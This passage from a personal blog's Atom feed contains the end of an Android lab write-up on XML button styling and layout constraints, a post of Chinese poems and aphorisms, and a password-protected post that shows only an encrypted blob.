/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--弧形按钮--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">corners</span> <span class="attr">android:radius</span>=<span class="string">"15dip"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--文字边界--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">padding</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:top</span>=<span class="string">"5dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:bottom</span>=<span class="string">"5dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:left</span>=<span class="string">"10dp"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:right</span>=<span class="string">"10dp"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">shape</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>实验遇到困难以及解决思路</p><p>1）图像约束布局不能按比例设置。刚开始设置<code>width=150px</code>，<code>height=0px</code>再根据1：1调整，但是发现height&gt;width，更改为<code>width=0px</code>与<code>height=150px</code>就是1：1的比例。原因：图像的底部没有约束其他控件，高度默认match_parent，而宽度是图像左右约束父组件边界，即居中显示，可以根据高度来调节宽度。或是将图像底部进行约束。</p><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/66126716.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/66126716.jpg"></p><p>2）参照实验文档提供的链接，设置按钮样式。新建.xml文件时，里面默认的标签是<code>&lt;selector&gt;</code>，而我们修改的是按钮的形状背景颜色，使用的标签应该是<code>&lt;shape&gt;</code>。改完按钮后，发现按钮字体是黑色，以为还是在.xml中改，改完之后发现不对，想起前面的文中都是直接添加<code>android:textColor=&quot;@color/colorBlack&quot;</code>的，所以就在<code>values/colors</code>中先添加colorWhite，再修改按钮字体。</p></li></ol><h2 id="四 课后实验结果"><a class="header-anchor" href="#四 课后实验结果" aria-hidden="true">¶</a> 四 课后实验结果</h2><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/38141086.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/38141086.jpg"><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/5988765.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/5988765.jpg"></p><p><strong>扩展</strong>：设置按钮UI，正常界面按钮颜色为深色，点击的时候变为浅色</p><p><strong>方法</strong>： 在<code>res/drawable</code>中新建两个xml，一个表示正常界面，另一个表示点击界面，两个.xml文件知识设置按钮背景颜色不同，其他样式一样，再新建一个.xml文件，使用selector标签，根据按钮的状态选择不同的按钮的样式</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">selector</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">android:drawable</span>=<span class="string">"@drawable/btn_shape"</span> <span class="attr">android:state_pressed</span>=<span class="string">"false"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">android:drawable</span>=<span class="string">"@drawable/btn_press"</span> <span class="attr">android:state_pressed</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">selector</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong><a href="https://github.com/YH-Chen/Android_lab" target="_blank" rel="noopener">Github</a></strong></p><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.6.0/katex.min.css">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/32091554/44004940-ca3e00c6-9e9d-11e8-84d4-ffeb47c183a3.jpg&quot; alt=&quot;sysu&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Android" scheme="http://www.danboard.me/categories/Android/"/>
    
    
      <category term="android" scheme="http://www.danboard.me/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>云雀叫了一整天</title>
    <link href="http://www.danboard.me/%E4%BA%91%E9%9B%80%E5%8F%AB%E4%BA%86%E4%B8%80%E6%95%B4%E5%A4%A9/"/>
    <id>http://www.danboard.me/云雀叫了一整天/</id>
    <published>2018-05-11T16:24:36.000Z</published>
    <updated>2018-05-12T03:27:37.172Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/3442554.jpg" alt="http://oxv1k8kvi.bkt.clouddn.com/18-5-12/3442554.jpg"></p><a id="more"></a><h4 id="甲辑"><a class="header-anchor" href="#甲辑" aria-hidden="true">¶</a> 甲辑</h4><h5 id="大心情"><a class="header-anchor" href="#大心情" aria-hidden="true">¶</a> 大心情</h5><p>文艺复兴是一种心情</p><p>此心情氤氲了整个欧罗巴</p><p>别的盛衰可依其行为而踪迹之</p><p>文艺复兴至今言犹在耳事犹在身</p><p>虽然不会再来虽然是这样</p><br><h5 id="巴黎六条新闻"><a class="header-anchor" href="#巴黎六条新闻" aria-hidden="true">¶</a> 巴黎六条新闻</h5><p>科西嘉的怪物在茹安港登陆</p><p>吃人魔王向格拉斯前进</p><p>篡位者进入格拉布林</p><p>波拿帕特占领里昂</p><p>拿破仑接近枫丹白露</p><p>陛下将于今日抵达忠实于他的巴黎</p><br><h5 id="知与爱"><a class="header-anchor" href="#知与爱" aria-hidden="true">¶</a> 知与爱</h5><p>我愿他人活在我身上</p><p>我愿自己活在他人身上</p><p>这是“知”</p><br><p>我曾经活在他人身上</p><p>他人曾经活在我身上</p><p>这是“爱”</p><br><p>雷奥纳多说</p><p>知得愈多，爱得愈多</p><p>爱得愈多，知得愈多</p><br><p>知与爱永成正比</p><br><h5 id="从前慢"><a class="header-anchor" href="#从前慢" aria-hidden="true">¶</a> 从前慢</h5><p>记得早先少年时</p><p>大家诚诚恳恳</p><p>说一句是一句</p><br><p>清晨上火车站</p><p>长街黑暗无行人</p><p>卖豆浆的小店冒着热气</p><br><p>从前的日色变得慢</p><p>车、马、邮件都慢</p><p>一生只够爱一个人</p><br><p>从前的锁也好看</p><p>钥匙精美有样子</p><p>你所了，人家就懂了</p><br><h5 id="我"><a class="header-anchor" href="#我" aria-hidden="true">¶</a> 我</h5><p>我是一个在黑暗中大雪纷飞的人哪</p><br><h5 id="素描旅者"><a class="header-anchor" href="#素描旅者" aria-hidden="true">¶</a> 素描旅者</h5><p>我在诺曼第作素描旅者</p><p>也就是背着行囊出入客栈</p><p>装作研究画道，观察风景</p><p>无忧呀无虑，不思明天做什么</p><p>停步，是为了一弯小溪</p><p>入店，是闻到油炸薯条的香味</p><p>幽会，在长满樱草的土坑中</p><p>或在保持白昼温度的麦穗上</p><p>灰色粗布下的肌肤极富弹性</p><p>我徜徉在一个叫佩努乡的小村里</p><p>依波尔和艾乐达之间</p><p>海岸高而陡，像巍巍的城墙</p><p>踏着细软的茸草，放歌</p><p>远处一艘艘的渔船</p><p>碧绿的海，棕红的帆</p><p>茂密的野菊和罂粟花</p><p>村里有座报时的尖顶钟楼</p><p>海鸥绕着飞叫</p><p>同时还可以坐在一处泉孔边</p><p>附身啜饮，沾湿鼻尖和胡子</p><p>随我自己设想是在与谁接吻</p><br><br><h4 id="乙辑"><a class="header-anchor" href="#乙辑" aria-hidden="true">¶</a> 乙辑</h4><p>给我的自由愈多 我用的自由愈少</p><p>我不树敌 敌自树</p><p>信投入邮筒 似乎已经到了收信人手里</p><p>回中国 故居的房门一开 那个去国前夕的我迎将出来</p><p>从前的那个我 如果来找现在的我 会得到很好的款待</p><p>久别重逢 那种漠然的紧张</p><p>花已不香了 人装出闻嗅的样子</p><p>我少年时 花还都很香 不同的香</p><p>神祇仙家也要上班值日 那就算了</p><p>思想家一醉成诗人 一怒成舞蹈家</p><p>读者应是比作者更高明 至少在一刹那间</p><p>春秋佳日 游客如蝗</p><p>提倡幽默 是最不幽默的事</p><p>走在老街上 我不来 街上是没有这些往事的</p><p>玩物丧志 其志小 志大者玩物养志</p><p>你强 强在你不爱我 我弱 弱在我爱你</p><p>旅馆中的一切陈设 无非告诉你此处非君家</p><p>李耳之水 庄周之木 耶稣的百合花 巴斯卡的芦苇 康德的星 皆无逻辑可循 却是绝妙的修辞</p><p>凡是我看不起的人 我都要多看两眼</p><p>往往是还未开始爱 爱已过去了</p><p>落魄英雄最可爱</p><p>坏人说我坏 我感到恢复了名誉</p><br><br><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.6.0/katex.min.css">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-5-12/3442554.jpg&quot; alt=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-5-12/3442554.jpg&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="拾人牙慧" scheme="http://www.danboard.me/categories/%E6%8B%BE%E4%BA%BA%E7%89%99%E6%85%A7/"/>
    
    
      <category term="reading" scheme="http://www.danboard.me/tags/reading/"/>
    
  </entry>
  
  <entry>
    <title>交叉线</title>
    <link href="http://www.danboard.me/%E4%BA%A4%E5%8F%89%E7%BA%BF/"/>
    <id>http://www.danboard.me/交叉线/</id>
    <published>2018-05-11T02:40:44.000Z</published>
    <updated>2018-05-11T02:54:54.568Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><link href="/style.css" rel="stylesheet" type="text/css"><script src="/crypto-js.js"></script><script src="/mcommon.js"></script><script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <div id="security"> <div class="input-container"> <input type="password" class="form-control" id="pass" placeholder=" Please enter the password to read. " /> <label for="pass"> Please enter the password to read. </label> <div class="bottom-line"></div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19igmuxTiynLymgcy88FpqUv8PM3Afcw4FcngGe3zZ3GMswMZ8yCF9k62310zKK5AgXgIrAoibMd7AgjUT2M+Da4Qjx57oUMCDOCsGlfW2STO32cliMMrEmBVexVIjveTHEOo8LBrg+1c6VIpZxGj6b/kwA0H4Oz2CH+wFB44fjDFMBAhObWnm9z2KK+jgDSFILgjH+UHw5NUsUKHg08j6bY4afzih7a3DzTmunj1pWH71UDJ816YYZ0L46jiUjPIeVVBTfsaQS0edqNw0sZ7ZlJ3nuI+8IpR2kwscMAsOXKySS9aK7XWPL26pYu8B+5d4JejMoJQuY3j6n5PluAombFSnrrbfA3jJIgZH//iX0W5nAEjp4xmfdtfK3nepePXKjjbSRwIJMBo3kNQbRg8odnGDFPj3WHGpZwIiemiPorBDXbFZbhiof48CnX1azRfFJIa9iQV4Cx0/KX2iZW7hPeYP2dHU0j0V3LSH4W/sU7+Ueq1TF/SyBJ9BBZ0f0lINCf3+KnGDufAJV6oJVa+KO1aw1e2QfNzvC3fnFKMLhk6YydW6gc+y8nJonpVaPFi9czIGIEiz8ZaGlPNYfrvcAwVmCm169cGD6zsX+ehBzAZBtAJ7bWVb4EDzKLXl877jISpO9QdRW8f2lMHdXW/nthiC8Fjsq68O3w3mzQJM+ZyZSKGjkhGsrdIM8RA76b9KBeUi/DuIyyTtcYByeimySIk9hXsx6A76UNm37zvk6txm2fAWkvI/vO+wsS6cOhifQOVfjuBAdrbKpVRg2j40r7c80fxRkQNtroB8FWnBFJfKbpzL4sWAx </div>]]></content>
    
    <summary type="html">
    
      &lt;img src=&quot;http://oxv1k8kvi.bkt.clouddn.com/18-5-11/18767873.jpg&quot;/&gt;
    
    </summary>
    
      <category term="胡言乱语" scheme="http://www.danboard.me/categories/%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/"/>
    
    
  </entry>
  
</feed>
